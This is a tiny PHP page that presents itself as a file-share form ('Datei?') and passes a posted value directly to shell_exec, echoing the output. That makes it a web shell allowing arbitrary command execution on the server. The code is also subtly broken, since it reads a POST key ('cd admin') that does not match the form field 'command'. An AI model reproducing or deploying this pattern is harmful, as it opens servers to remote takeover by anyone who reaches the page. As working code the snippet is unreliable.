<form action="fileshare.php" method="post">
Datei? <input type="text" name="command">
<input type="submit">
</form>

<?php
$command = $_POST["cd admin"];


echo "<pre>";
echo shell_exec($command);
echo "</pre>";

?>